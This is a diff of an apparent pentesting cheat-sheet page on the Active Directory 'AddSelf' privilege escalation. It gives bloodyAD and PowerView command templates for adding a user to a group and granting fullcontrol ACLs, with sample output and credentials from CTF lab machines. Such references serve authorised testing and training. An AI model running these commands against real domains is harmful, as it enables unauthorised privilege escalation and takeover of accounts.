@@ -1,80 +1,105 @@
 ---
 title: "AddSelf"
-tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controller", "Addself", "Active Directory", "Windows", "BloodyAD"]
+tags: ["Active Directory", "AddSelf", "AddMember", "Addself", "BloodyAD", "Domain Controller", "Genericall", "Group Policy", "Powerview", "Windows"]
 ---
 
-### Privesc #1: Add Self to Group (From Linux)
+{{< filter_buttons >}}
 
-{{< tab set1 tab1 >}}bloodyAD{{< /tab >}}
-{{< tab set1 tab2 >}}powerview.py{{< /tab >}}
+### Add Self to Group
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set1-1 tab2 >}}powerview.py{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
 #### 1. Add Self to Group
 
-```console
+```console {class="password"}
 # Password
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
-[+] oorend added to SERVICEMGMT
-```
-
-```console
+```console {class="ntlm"}
 # NTLM
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console
-# Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-```console {class="sample-code"}
-$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
-[+] m.lovegod added to NETWORK AUDIT
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
-#### 2. Add GenericAll over Target Group
-
-```console
-# Password
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
-```
-
-```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
-[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
-```
-
-```console
-# Kerberos
-bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
-```
-
-```console {class="sample-code"}
-$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
-[+] m.lovegod has now GenericAll on NETWORK AUDIT
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+{{< tabcontent set1-1 tab2 >}}
 
 #### 1. Connect
 
-```console
-sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```console {class="password"}
+# Password
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
-Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
-[2024-09-24 07:11:06] Channel binding is enforced!
-(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
-PV > 
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm"}
+# NTLM
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
 ```
 
 #### 2. Add Self to Group
@@ -84,74 +109,21 @@ Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
 ```
 
 ```console {class="sample-code"}
-PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
-[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
-```
-
-```console
-# Check
-Get-DomainGroupMember -Identity '<GROUP>'
-```
-
-```console {class="sample-code"}
-PV > Get-DomainGroupMember -Identity 'servicemgmt'
-GroupDomainName             : ServiceMgmt
-GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
-MemberDomain                : rebound.htb
-MemberName                  : ppaul
-MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
-MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
-
----[SNIP]---
-
-GroupDomainName             : ServiceMgmt
-GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
-MemberDomain                : rebound.htb
-MemberName                  : oorend
-MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
-MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
-```
-
-#### 4. Add Fullcontrol over Target Group
-
-```console
-# Exit and login again to apply changes
-Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
-```
-
-```console {class="sample-code"}
-PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
-[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
-[2024-09-24 07:37:24] DACL modified successfully!
-```
-
-```console
-# Check
-Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
-```
-
-```console {class="sample-code"}
-PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
-ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
-ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
-ACEType                     : ACCESS_ALLOWED_ACE
-ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
-ActiveDirectoryRights       : FullControl
-AccessMask                  : 0xf01ff
-InheritanceType             : None
-SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'SUPPORT_SERVICES' -PrincipalIdentity 'haze-it-backup$' -Rights fullcontrol
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Found target identity: CN=Support_Services,CN=Users,DC=haze,DC=htb
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Found principal identity: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+[2025-10-31 22:23:23] Adding FullControl to S-1-5-21-323145914-28650650-2368316563-1112
+[2025-10-31 22:23:23] [Add-DomainObjectACL] Success! Added ACL to CN=Support_Services,CN=Users,DC=haze,DC=htb
 ```
 
 <small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
 
 {{< /tabcontent >}}
-
-### Privesc #1: Add Self to Group (From Windows)
-
-{{< tab set2 tab1 >}}Windows{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+{{< tab set1-2 tab1 active >}}powershell{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
 
 #### 1. Import PowerView
 
@@ -159,54 +131,31 @@ SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-
 . .\PowerView.ps1
 ```
 
-```console {class=sample-code}
-*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+```console {class="sample-code"}
+evil-winrm-py PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a cred object (runas) \[optional\]
+#### 2. Add Self to the Group
 
 ```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Add Self to Group
-
-```console
-Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
+Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
-Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+evil-winrm-py PS C:\programdata> Add-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Members 'haze-it-backup$'
 ```
 
+#### 4. Check
+
 ```console
-# Check
-Get-DomainGroupMember -Identity '<GROUP>'
+Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> | fl MemberName
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
-Get-DomainGroupMember -Identity 'security engineers'
+evil-winrm-py PS C:\programdata> Get-DomainGroupMember -Identity 'SUPPORT_SERVICES' -Domain haze.htb -DomainController dc01.haze.htb | fl MemberName
 
----[SNIP]---
-
-GroupDomain             : corp.local
-GroupName               : Security Engineers
-GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
-MemberDomain            : corp.local
-MemberName              : user
-MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
-MemberObjectClass       : user
-MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
+MemberName : Haze-IT-Backup$
 ```
 
+{{< /tabcontent >}}
 {{< /tabcontent >}}
